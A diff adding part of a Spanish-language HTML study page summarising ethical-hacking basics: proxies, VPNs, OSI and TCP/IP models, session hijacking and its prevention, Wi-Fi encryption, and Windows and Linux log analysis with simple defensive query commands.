+                    <p>Herramientas: Squid, NGINX (como reverse proxy)</p>
+                    <p>Consideraciones: Configurar correctamente para evitar fugas de información o bypass no
+                        autorizados.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>VPN (Red Privada Virtual) <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Una VPN crea un túnel seguro entre dos puntos a través de una red no segura como Internet.</p>
+                    <h4>Protocolos comunes:</h4>
+                    <ul>
+                        <li>OpenVPN</li>
+                        <li>IPsec</li>
+                        <li>WireGuard</li>
+                    </ul>
+                    <p>Herramientas: OpenVPN, strongSwan (para IPsec)</p>
+                    <p>Consideraciones: Usar cifrado fuerte, mantener actualizados los clientes y servidores VPN.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="network-models">
+            <h2><i class="fas fa-layer-group"></i> Modelos de Red</h2>
+            <div class="expandable">
+                <h3>Modelo OSI <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>El modelo OSI (Open Systems Interconnection) es un marco conceptual que describe cómo los datos
+                        se comunican en una red.</p>
+                    <h4>Capas y sus PDUs (Protocol Data Units):</h4>
+                    <ol>
+                        <li>Física - Bits</li>
+                        <li>Enlace de datos - Tramas</li>
+                        <li>Red - Paquetes</li>
+                        <li>Transporte - Segmentos (TCP) / Datagramas (UDP)</li>
+                        <li>Sesión - Datos</li>
+                        <li>Presentación - Datos</li>
+                        <li>Aplicación - Datos</li>
+                    </ol>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>TCP/IP <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>El modelo TCP/IP es el conjunto de protocolos de comunicación usado en Internet y redes
+                        similares.</p>
+                    <h4>Capas:</h4>
+                    <ol>
+                        <li>Acceso a la red</li>
+                        <li>Internet (IP)</li>
+                        <li>Transporte (TCP/UDP)</li>
+                        <li>Aplicación</li>
+                    </ol>
+                    <p>Herramientas: Wireshark para análisis de protocolos</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="network-attacks-advanced">
+            <h2><i class="fas fa-user-ninja"></i> Ataques de Red Avanzados</h2>
+            <div class="expandable">
+                <h3>Hijacking <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>El hijacking implica tomar el control de una sesión establecida entre dos sistemas.</p>
+                    <h4>Tipos comunes:</h4>
+                    <ul>
+                        <li>Session Hijacking</li>
+                        <li>TCP Hijacking</li>
+                        <li>Browser Hijacking</li>
+                    </ul>
+                    <p>Herramientas: Ettercap, Firesheep (para session hijacking)</p>
+                    <p>Prevención: Usar HTTPS, implementar autenticación continua, usar tokens de sesión seguros.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="wireless-security">
+            <h2><i class="fas fa-wifi"></i> Seguridad en Redes Inalámbricas</h2>
+            <div class="expandable">
+                <h3>Encriptación de Redes Wi-Fi <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <h4>WEP (Wired Equivalent Privacy)</h4>
+                    <p>Obsoleto y fácilmente crackeable. No se debe usar.</p>
+                    <h4>WPA (Wi-Fi Protected Access)</h4>
+                    <p>Mejora sobre WEP, pero aún vulnerable a ciertos ataques.</p>
+                    <h4>WPA2 (Wi-Fi Protected Access 2)</h4>
+                    <p>Estándar actual, usa cifrado AES.</p>
+                    <h4>WPA3</h4>
+                    <p>La versión más reciente con mejoras de seguridad adicionales.</p>
+                    <p>Herramientas: Aircrack-ng para pruebas de seguridad Wi-Fi</p>
+                    <p>Prevención: Usar WPA2 o WPA3 con contraseñas fuertes, habilitar el filtrado MAC si es posible.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <section id="log-analysis">
+            <h2><i class="fas fa-search"></i> Análisis de Logs</h2>
+            <div class="expandable">
+                <h3>Registro de Eventos de Windows <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Windows Event Viewer proporciona logs detallados de actividades del sistema y aplicaciones.</p>
+                    <h4>Tipos principales de logs:</h4>
+                    <ul>
+                        <li>Aplicación</li>
+                        <li>Seguridad</li>
+                        <li>Sistema</li>
+                    </ul>
+                    <p>Herramientas: Event Viewer, PowerShell para consultas avanzadas</p>
+                    <pre><code>
+        # Consulta de eventos de seguridad con PowerShell
+        Get-WinEvent -LogName Security | Where-Object {$_.ID -eq 4624}
+                    </code></pre>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Logs de Linux <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Los sistemas Linux almacenan logs en el directorio /var/log.</p>
+                    <h4>Archivos de log importantes:</h4>
+                    <ul>
+                        <li>/var/log/auth.log o /var/log/secure</li>
+                        <li>/var/log/syslog</li>
+                        <li>/var/log/apache2/access.log</li>
+                    </ul>
+                    <p>Herramientas: grep, awk, journalctl (para sistemas con systemd)</p>
+                    <pre><code>
+        # Buscar intentos de inicio de sesión fallidos
+        grep "Failed password" /var/log/auth.log
+        
+        # Monitorear logs en tiempo real
+        tail -f /var/log/syslog
+                    </code></pre>
+                    <p>Consideraciones: Configurar rotación de logs para evitar que ocupen todo el espacio en disco.</p>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer>
+        <p>&copy; 2023 Resumen de Hacking Ético Damian jinel. Todos los derechos reservados.</p>
+    </footer>
+
+    <script src="modo_hacker.js"></script>
+</body>
+
+</html>
